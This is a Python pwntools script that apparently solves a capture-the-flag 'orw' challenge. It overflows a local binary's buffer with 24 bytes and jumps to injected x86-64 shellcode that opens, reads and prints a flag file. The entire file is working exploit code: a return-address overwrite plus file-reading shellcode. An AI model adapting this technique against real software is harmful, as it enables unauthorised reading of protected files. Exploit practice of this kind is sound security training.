from pwn import *

context.arch = 'amd64'
p = process('./orw')
# p = gdb.debug('./orw', 'b *0x4009be')

sh = asm(
    '''
    mov rax, 0x67616c66
    push rax
    mov rax, 0x2f37383636353570
    push rax
    mov rax, 0x706f2f656d6f682f
    push rax
    mov rdi, rsp
    mov rax, 2
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x60
    xor rax, rax
    syscall

    mov rdi, 1
    mov rax, 1
    syscall
    ''', arch = 'amd64')
junk = b'a'*24
scAddr = 0x6010A0
payload = junk + p64(scAddr)
sh2 = asm(shellcraft.pushstr('/home/opp556687/flag') + shellcraft.open('rsp', 0, 0) + shellcraft.read('rax', 'rsp', 0x30) + shellcraft.write(1, 'rsp', 0x30))
p.sendlineafter('>', sh)
p.sendlineafter(':)', payload)

print(p.recvall())